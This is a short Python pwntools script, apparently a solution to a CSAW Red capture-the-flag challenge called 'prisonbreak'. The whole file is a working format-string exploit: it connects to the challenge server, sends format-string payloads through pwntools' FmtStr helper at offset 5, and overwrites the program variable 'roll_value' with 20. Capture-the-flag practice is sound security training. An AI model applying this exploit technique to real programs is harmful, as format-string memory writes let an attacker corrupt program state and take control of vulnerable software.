from pwn import *
def send(payload):
	#p = process("./prisonbreak")
	p = remote("pwn.red.csaw.io", 5004)
	p.recvuntil(">")
	p.sendline(payload)
	print(payload)
	p.recvuntil("AWK! ")
	x= p.recvuntil(",\"")[:-2]
	print(x)
	print(p.recvall().decode())
	return x
elf = ELF("./prisonbreak")
format_str = FmtStr(execute_fmt=send,offset=5)
format_str.write(elf.symbols["roll_value"],20)
format_str.execute_writes()
